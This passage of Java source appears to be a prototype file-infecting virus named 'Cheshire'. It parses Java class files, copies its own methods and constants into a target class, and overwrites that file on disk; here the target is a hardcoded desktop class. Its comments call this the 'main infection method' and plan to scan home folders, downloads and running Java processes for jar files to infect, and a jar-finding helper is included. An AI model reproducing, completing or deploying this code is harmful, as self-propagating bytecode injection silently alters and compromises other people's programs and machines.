     * @param parsedClass
     * @return
     */
    public static String getClassName(HashMap<String, Object> parsedClass){
        byte[] selfClassBytes = (byte[]) parsedClass.get("this_class");
        byte[][] constant_pool = (byte[][]) parsedClass.get("constant_pool");
        ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
        int self_class_index = selfBytes.getShort();
        byte[] selfClass = constant_pool[self_class_index-1];
        ByteBuffer selfClassBuff = ByteBuffer.wrap(selfClass);
        selfClassBuff.get();
        int classNameIndex = selfClassBuff.getShort();
        return getUtf8Constant(classNameIndex, parsedClass);
    }

    /**
     * Let's think about how we're doing this...
     *
     * Ideally we want to pass in the original constant index, copy the data, place it in the target
     * and return the new index. This makes copying methods easier when it comes to the attributes.
     *
     * @return The new index of the copied constant
     */
   public static int copyConstant(HashMap<String, Object> origin, int origin_index, HashMap<String, Object> destination){
       byte[][] constant_pool = (byte[][]) origin.get("constant_pool");
       byte[] orig_constant = constant_pool[origin_index-1];

       //Create a map between the old and new constant pools
       //This will help us avoid copying too many vars over and being wasteful
       if(origin.get("constant_pool_map") == null){
           HashMap<Integer, Integer> constant_pool_map = new HashMap<Integer, Integer>();
           origin.put("constant_pool_map", constant_pool_map);
       }
       HashMap<Integer, Integer> constant_pool_map = (HashMap<Integer, Integer>) origin.get("constant_pool_map");
       if(constant_pool_map.keySet().contains(origin_index)){
           return constant_pool_map.get(origin_index);
       }
       int const_tag = orig_constant[0];
       if(const_tag == 1){
           int new_index = addToPool(destination, orig_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 7){
           ByteBuffer b = ByteBuffer.allocate(3);
           int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_name_index = copyConstant(origin, orig_name_index, destination);
           b.put(orig_constant[0]);
           b.putShort((short) new_name_index);
           byte[] new_constant = b.array();
           int new_index;
           if(getClassName(origin).equals(getUtf8Constant(orig_name_index, origin))){
               byte[] selfClassBytes = (byte[]) destination.get("this_class");
               ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
               new_index = selfBytes.getShort();
           }
           else{
               new_index = addToPool(destination, new_constant);
               constant_pool_map.put(origin_index, new_index);
           }
           return new_index;
       }
       else if(const_tag == 9 || const_tag == 10 || const_tag == 11){
           ByteBuffer b = ByteBuffer.allocate(5);
           int orig_class_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_class_index = copyConstant(origin, orig_class_index, destination);
           String thisClass = getClassName(origin);
           byte[] methodClassBytes = constant_pool[orig_class_index-1];
           ByteBuffer methodClassBuffer = ByteBuffer.wrap(methodClassBytes);
           methodClassBuffer.get();
           int classNameIndex = methodClassBuffer.getShort();
           String methodClassName = getUtf8Constant(classNameIndex, origin);
           if(methodClassName.equals(getClassName(origin))){
               byte[] selfClassBytes = (byte[]) destination.get("this_class");
               byte[][] t_constant_pool = (byte[][]) destination.get("constant_pool");
               ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
               new_class_index = selfBytes.getShort();
           }
           b.put(orig_constant[0]);
           b.putShort((short) new_class_index);
           int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
           b.putShort((short) new_name_and_type_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 8){
           ByteBuffer b = ByteBuffer.allocate(3);
           b.put(orig_constant[0]);
           int orig_string_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_string_index = copyConstant(origin, orig_string_index, destination);
           b.putShort((short) new_string_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;

       }
       else if(const_tag == 3 || const_tag == 4 || const_tag == 5 || const_tag == 6){
           int new_index = addToPool(destination, orig_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 12){
           ByteBuffer b = ByteBuffer.allocate(5);
           b.put(orig_constant[0]);
           int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_name_index = copyConstant(origin, orig_name_index, destination);
           b.putShort((short) new_name_index);
           int orig_descriptor_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
           b.putShort((short) new_descriptor_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 15){
           ByteBuffer b = ByteBuffer.allocate(4);
           b.put(orig_constant[0]);
           b.put(orig_constant[1]);
           int old_reference_index = (short) (((orig_constant[2] & 0xFF) << 8) | (orig_constant[3] & 0xFF));
           int new_reference_index = copyConstant(origin, old_reference_index, destination);
           b.putShort((short) new_reference_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 16){
           ByteBuffer b = ByteBuffer.allocate(3);
           b.put(orig_constant[0]);
           int orig_descriptor_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
           int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
           b.putShort((short) new_descriptor_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else if(const_tag == 18){
           ByteBuffer b = ByteBuffer.allocate(5);
           b.put(orig_constant[0]);
           b.put(orig_constant[1]);
           b.put(orig_constant[2]);
           int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
           int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
           b.putShort((short) new_name_and_type_index);
           byte[] new_constant = b.array();
           int new_index = addToPool(destination, new_constant);
           constant_pool_map.put(origin_index, new_index);
           return new_index;
       }
       else{
           return -1;
       }
   }

    /**
     * Find jar files given a directory
     * @param f
     * @return
     */
    public static void searchFile(File file, ArrayList<File> fileList) {
        File[] files = file.listFiles();
        if (files != null) {
            for (File f : file.listFiles()) {
                if (f.isFile() && f.getName().endsWith(".jar")) {
                    System.out.println("Added " + f.getAbsolutePath());
                    fileList.add(f);
                } else if (f.isDirectory() && f.canRead()) {
                    searchFile(f, fileList);
                }
            }
        }

    }
    /**
     * This is our main infection method.
     * We need to determine the target classfile name when we're copying this
     * because you can't figure out what class you're in while you're using a
     * static method. Can't call a method without a class unless the method is
     * statis, so we're at a bit of a catch-22. The solution is simple to hardcode
     * the class in the propagated bytecode.
     *
     * We need to know if we can just inject static methods or not. It seems like either
     * way you'd still need to change the constant pool.
     */
    public static void Cheshire() throws IOException {
        System.out.println("We're all mad down here...you may notice that I'm not all there myself.");

        /**
         * What logic do we want to implement?
         * Search folders for jar files, open them, look for main classes and infect?
         * Sounds good. How do we get our current path? Also need to know if on Linux or Windows.
         * Scan user dirs, home folders, downloads and look for running Java processes if on applicable version.
         */
        String h = MethodHandles.lookup().lookupClass().getResource(MethodHandles.lookup().lookupClass().getName() + ".class").getPath();
        System.out.println(h);
        String selfpath = SelfExamine.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("file:", "") + "SelfExamine.class";
        System.out.println(selfpath);
        String OS = (String) System.getProperties().get("os.name");
        String homedir = (String) System.getProperties().get("user.home");
        File home = new File(homedir);
        File fa = new File("dongs.txt");
        fa.createNewFile();


        System.out.println("Detected OS is " + OS);
        System.out.println("Home directory is " + homedir);
        File f = new File(".");
        System.out.println("Absolute path:" + f.getAbsolutePath());
        System.out.println("Directory listing:");

        for(String s : f.list()){
            System.out.println(s);
        }
        System.out.println(f.list());
        selfpath = selfpath.substring(1);
        HashMap<String, Object> parsedClass = parseClassFile(selfpath);
        HashMap<String, Object> goatClass = parseClassFile("C:\\Users\\Mike\\Desktop\\VirtualMachineTest.class");
        findOurMethods(parsedClass, goatClass);
        inject(parsedClass, goatClass);

        FileOutputStream fos = new FileOutputStream(new File("C:\\Users\\Mike\\Desktop\\VirtualMachineTest.class"));
        byte[] classbytes = classBytes(goatClass);
        fos.write(classbytes);
        fos.close();

    }

    /**
     * Return a hashmap with all of our shit in it.
     * We want to break this down into a hashmap of the sections
     * with maybe an arraylist of...objects? How do we keep the complexity low?
     * Store them as bytes? Do I even need to write a full parser? Probably not.
     *
     *
     * @param classfilepath
     * @return
     * @throws IOException
     */
    public static HashMap<String, Object> parseClassFile(String classfilepath) {
        try {

            Paths.get(classfilepath);
            byte[] classbytes = Files.readAllBytes(Paths.get(classfilepath));

            DataInputStream dis = new DataInputStream(new ByteArrayInputStream(classbytes));
            byte[] magic = new byte[4];

            HashMap<String, Object> parsedClass = new HashMap<String, Object>();
            dis.read(magic);
            StringBuilder sb = new StringBuilder();

            for (byte b : magic) {
                sb.append(String.format("%02X", b));
            }

            if (sb.toString().equals("CAFEBABE")) {
                parsedClass.put("magic", magic);
                byte[] minor_version = new byte[2];
                dis.read(minor_version);
                parsedClass.put("minor_version", minor_version);
                byte[] major_version = new byte[2];
                dis.read(major_version);
                parsedClass.put("major_version", major_version);
                byte[] constant_pool_count = new byte[2];
                dis.read(constant_pool_count);
                parsedClass.put("constant_pool_count", constant_pool_count);
                int constant_count_int = (short) (((constant_pool_count[0] & 0xFF) << 8) | (constant_pool_count[1] & 0xFF));
                byte[][] constant_pool = new byte[constant_count_int-1][];

                for (int i = 0; i < constant_count_int-1; i++) {

                    byte tagbyte = dis.readByte();
                    int tag = tagbyte;

                    if (tag == 7) {
                        // CONSTANT_Class_info
                        byte[] class_info_bytes = new byte[3];
                        class_info_bytes[0] = tagbyte;
                        class_info_bytes[1] = dis.readByte();
                        class_info_bytes[2] = dis.readByte();
                        constant_pool[i] = class_info_bytes;
                    } else if (tag == 9) {
                        //Constant_Fieldref
                        byte[] fieldref_info_bytes = new byte[5];
                        fieldref_info_bytes[0] = tagbyte;
                        fieldref_info_bytes[1] = dis.readByte();
                        fieldref_info_bytes[2] = dis.readByte();
                        fieldref_info_bytes[3] = dis.readByte();
                        fieldref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = fieldref_info_bytes;
                    } else if (tag == 10) {
                        //Constant_Methodref
                        byte[] methodref_info_bytes = new byte[5];
                        methodref_info_bytes[0] = tagbyte;
                        methodref_info_bytes[1] = dis.readByte();
                        methodref_info_bytes[2] = dis.readByte();
                        methodref_info_bytes[3] = dis.readByte();
                        methodref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = methodref_info_bytes;
                    } else if (tag == 11) {
                        //Constant_InterfaceMethodref
                        byte[] interfacemethodref_info_bytes = new byte[5];
                        interfacemethodref_info_bytes[0] = tagbyte;
                        interfacemethodref_info_bytes[1] = dis.readByte();
                        interfacemethodref_info_bytes[2] = dis.readByte();
                        interfacemethodref_info_bytes[3] = dis.readByte();
                        interfacemethodref_info_bytes[4] = dis.readByte();
                        constant_pool[i] = interfacemethodref_info_bytes;
                    } else if (tag == 8) {
                        //Constant_String
                        byte[] string_info_bytes = new byte[3];
                        string_info_bytes[0] = tagbyte;
                        string_info_bytes[1] = dis.readByte();
                        string_info_bytes[2] = dis.readByte();
                        constant_pool[i] = string_info_bytes;
                    } else if (tag == 3) {
                        //Constant_Integer
                        byte[] integer_info_bytes = new byte[5];
                        integer_info_bytes[0] = tagbyte;
                        integer_info_bytes[1] = dis.readByte();
                        integer_info_bytes[2] = dis.readByte();
                        integer_info_bytes[3] = dis.readByte();
                        integer_info_bytes[4] = dis.readByte();
                        constant_pool[i] = integer_info_bytes;
                    } else if (tag == 4) {
                        //Constant_Float
                        byte[] float_info_bytes = new byte[5];
                        float_info_bytes[0] = tagbyte;
                        float_info_bytes[1] = dis.readByte();
                        float_info_bytes[2] = dis.readByte();
                        float_info_bytes[3] = dis.readByte();
                        float_info_bytes[4] = dis.readByte();
                        constant_pool[i] = float_info_bytes;
                    } else if (tag == 5) {
                        //Constant_Long
                        byte[] long_info_bytes = new byte[9];
                        long_info_bytes[0] = tagbyte;
                        long_info_bytes[1] = dis.readByte();
                        long_info_bytes[2] = dis.readByte();
                        long_info_bytes[3] = dis.readByte();
                        long_info_bytes[4] = dis.readByte();
                        long_info_bytes[5] = dis.readByte();
                        long_info_bytes[6] = dis.readByte();
                        long_info_bytes[7] = dis.readByte();
                        long_info_bytes[8] = dis.readByte();
                        constant_pool[i] = long_info_bytes;
                    } else if (tag == 6) {
                        //Constant_Double
                        byte[] double_info_bytes = new byte[9];
                        double_info_bytes[0] = tagbyte;
                        double_info_bytes[1] = dis.readByte();
                        double_info_bytes[2] = dis.readByte();
                        double_info_bytes[3] = dis.readByte();
                        double_info_bytes[4] = dis.readByte();
                        double_info_bytes[5] = dis.readByte();
                        double_info_bytes[6] = dis.readByte();
                        double_info_bytes[7] = dis.readByte();
                        double_info_bytes[8] = dis.readByte();
                        constant_pool[i] = double_info_bytes;
                    } else if (tag == 12) {
                        //Constant_NameAndType
                        byte[] nameandtype_info_bytes = new byte[5];
                        nameandtype_info_bytes[0] = tagbyte;
                        nameandtype_info_bytes[1] = dis.readByte();
                        nameandtype_info_bytes[2] = dis.readByte();
                        nameandtype_info_bytes[3] = dis.readByte();
                        nameandtype_info_bytes[4] = dis.readByte();
                        constant_pool[i] = nameandtype_info_bytes;
                    } else if (tag == 1) {
                        //Constant_Utf8
                        byte[] lengthbytes = new byte[2];
                        lengthbytes[0] = dis.readByte();
                        lengthbytes[1] = dis.readByte();
                        int length = (short) (((lengthbytes[0] & 0xFF) << 8) | (lengthbytes[1] & 0xFF));
                        byte[] utf_bytes = new byte[3 + length];
                        utf_bytes[0] = tagbyte;
                        utf_bytes[1] = lengthbytes[0];
                        utf_bytes[2] = lengthbytes[1];
                        for (int a = 0; a < length; a++) {
                            utf_bytes[a + 3] = dis.readByte();
                        }
                        constant_pool[i] = utf_bytes;
                    } else if (tag == 15) {
                        //Constant_MethodHandle
                        byte[] methodhandle_info_bytes = new byte[4];
                        methodhandle_info_bytes[0] = tagbyte;
                        methodhandle_info_bytes[1] = dis.readByte();
                        methodhandle_info_bytes[2] = dis.readByte();
                        methodhandle_info_bytes[3] = dis.readByte();
                        constant_pool[i] = methodhandle_info_bytes;
                    } else if (tag == 16) {
                        //Constant_MethodType
                        byte[] methodtype_info_bytes = new byte[3];
                        methodtype_info_bytes[0] = tagbyte;
                        methodtype_info_bytes[1] = dis.readByte();
                        methodtype_info_bytes[2] = dis.readByte();
                        constant_pool[i] = methodtype_info_bytes;
                    } else if (tag == 18) {
                        //Constant_InvokeDynamic
                        byte[] invokedynamic_info_bytes = new byte[5];
                        invokedynamic_info_bytes[0] = tagbyte;
                        invokedynamic_info_bytes[1] = dis.readByte();
                        invokedynamic_info_bytes[2] = dis.readByte();
                        invokedynamic_info_bytes[3] = dis.readByte();
                        invokedynamic_info_bytes[4] = dis.readByte();
                        constant_pool[i] = invokedynamic_info_bytes;
                    } else {
                    }

                }
                parsedClass.put("constant_pool", constant_pool);
                byte[] access_flags = new byte[2];
                dis.read(access_flags);
                parsedClass.put("access_flags", access_flags);
                byte[] this_class = new byte[2];
                dis.read(this_class);
                parsedClass.put("this_class", this_class);
                byte[] super_class = new byte[2];
                dis.read(super_class);
                parsedClass.put("super_class", super_class);
                byte[] interfaces_count = new byte[2];
                dis.read(interfaces_count);
                parsedClass.put("interfaces_count", interfaces_count);

                int iface_count = (short) (((interfaces_count[0] & 0xFF) << 8) | (interfaces_count[1] & 0xFF));
                byte[][] interfaces = new byte[iface_count][];

                for (int iface_loop = 0; iface_loop < iface_count; iface_loop++) {
                    byte[] iface = new byte[2];
                    iface[0] = dis.readByte();
                    iface[1] = dis.readByte();
                    interfaces[iface_loop] = iface;
                }

                parsedClass.put("interfaces", interfaces);

                byte[] fields_count = new byte[2];
                dis.read(fields_count);
                parsedClass.put("fields_count", fields_count);
                int f_count = (short) (((fields_count[0] & 0xFF) << 8) | (fields_count[1] & 0xFF));

                byte[][] fields = new byte[f_count][];

                for (int fields_loop = 0; fields_loop < f_count; fields_loop++) {
                    ByteArrayOutputStream field = new ByteArrayOutputStream();
                    byte[] fieldfixed = new byte[8];
                    dis.read(fieldfixed);
                    field.write(fieldfixed);
                    int attributes_count = (short) (((fieldfixed[6] & 0xFF) << 8) | (fieldfixed[7] & 0xFF));
                    for (int attributes = 0; attributes < attributes_count; attributes++) {
                        ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                        byte[] attribute_name_index = new byte[2];
                        byte[] attribute_length = new byte[4];
                        dis.read(attribute_name_index);
                        dis.read(attribute_length);
                        int attribute_len = ByteBuffer.wrap(attribute_length).getInt();
                        byte[] info = new byte[attribute_len];
                        dis.read(info);
                        attribute.write(attribute_name_index);
                        attribute.write(attribute_length);
                        attribute.write(info);
                        field.write(attribute.toByteArray());
                    }
                    fields[fields_loop] = field.toByteArray();
                }

                parsedClass.put("fields", fields);

                byte[] methods_count = new byte[2];
                dis.read(methods_count);

                parsedClass.put("methods_count", methods_count);

                int method_count = (short) (((methods_count[0] & 0xFF) << 8) | (methods_count[1] & 0xFF));

                byte[][] methods = new byte[method_count][];

                for (int methods_loop = 0; methods_loop < method_count; methods_loop++) {
                    ByteArrayOutputStream methodbytes = new ByteArrayOutputStream();
                    byte[] methodfixed = new byte[8];
                    dis.read(methodfixed);
                    int attribute_count = (short) (((methodfixed[6] & 0xFF) << 8) | (methodfixed[7] & 0xFF));
                    ByteArrayOutputStream method_attributes = new ByteArrayOutputStream();

                    for (int attribute_loop = 0; attribute_loop < attribute_count; attribute_loop++) {
                        ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                        byte[] attribute_name_index = new byte[2];
                        byte[] attribute_length = new byte[4];
                        dis.read(attribute_name_index);
                        dis.read(attribute_length);
                        int attribute_length_int = ByteBuffer.wrap(attribute_length).getInt();
                        byte[] attribute_bytes = new byte[attribute_length_int];
                        dis.read(attribute_bytes);
                        attribute.write(attribute_name_index);
                        attribute.write(attribute_length);
                        attribute.write(attribute_bytes);
                        method_attributes.write(attribute.toByteArray());
                    }
                    methodbytes.write(methodfixed);
                    methodbytes.write(method_attributes.toByteArray());
                    methods[methods_loop] = methodbytes.toByteArray();
                }
                parsedClass.put("methods", methods);

                byte[] attributes_count = new byte[2];

                dis.read(attributes_count);

                parsedClass.put("attributes_count", attributes_count);

                int attribute_count = (short) (((attributes_count[0] & 0xFF) << 8) | (attributes_count[1] & 0xFF));

                byte[][] attributes = new byte[attribute_count][];

                for (int attribute_loop = 0; attribute_loop < attribute_count; attribute_loop++) {
                    ByteArrayOutputStream attribute = new ByteArrayOutputStream();
                    byte[] attribute_name_index = new byte[2];
                    byte[] attribute_length = new byte[4];
                    dis.read(attribute_name_index);
                    dis.read(attribute_length);
                    attribute.write(attribute_name_index);
                    attribute.write(attribute_length);
                    int attribute_length_int = ByteBuffer.wrap(attribute_length).getInt();
                    byte[] attribute_bytes = new byte[attribute_length_int];
                    dis.read(attribute_bytes);
                    attribute.write(attribute_bytes);
                    attributes[attribute_loop] = attribute.toByteArray();
                }
                parsedClass.put("attributes", attributes);
                dis.close();
                //fis.close();
                return parsedClass;

            } else {
                return null;
            }
        }
        catch(IOException e){
            e.printStackTrace();
        }
        return null;
    };

    /**
     * Convert a manipulated class back to bytes for writing.
     * @param parsedClass
     * @return
     * @throws IOException
     */
    public static byte[] classBytes(HashMap<String, Object> parsedClass) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write((byte[]) parsedClass.get("magic"));
        bos.write((byte[]) parsedClass.get("minor_version"));
        bos.write((byte[]) parsedClass.get("major_version"));
        byte[][] constant_pool = (byte[][]) parsedClass.get("constant_pool");
        int cp_length = constant_pool.length + 1;

        ByteBuffer b = ByteBuffer.allocate(2);
        b.putShort((short) cp_length);
        byte[] cp_length_bytes = b.array();
        bos.write(cp_length_bytes);

        for(int i = 0; i < constant_pool.length; i++){
            bos.write(constant_pool[i]);
        }
        bos.write((byte[]) parsedClass.get("access_flags"));
        bos.write((byte[]) parsedClass.get("this_class"));
        bos.write((byte[]) parsedClass.get("super_class"));
        bos.write((byte[]) parsedClass.get("interfaces_count"));
        byte[][] interfaces = (byte[][]) parsedClass.get("interfaces");
        for(int i = 0; i < interfaces.length; i++){
            bos.write(interfaces[i]);
        }
        bos.write((byte[]) parsedClass.get("fields_count"));
        byte[][] fields = (byte[][]) parsedClass.get("fields");
        for(int i = 0; i < fields.length; i++){
            bos.write(fields[i]);
        }

        byte[][] methods = (byte[][]) parsedClass.get("methods");

        b.clear();
        b.putShort((short) methods.length);
        byte[] methods_count = b.array();
        bos.write(methods_count);
        for(int i = 0; i < methods.length; i++){
            bos.write(methods[i]);
        }

        bos.write((byte[]) parsedClass.get("attributes_count"));

        byte[][] attributes = (byte[][]) parsedClass.get("attributes");
        for(int i = 0; i < attributes.length; i++){
            bos.write(attributes[i]);
        }

        return bos.toByteArray();
    }

    public static void main(String[] args) throws IOException{
        Cheshire();
        System.exit(0);
    }
}
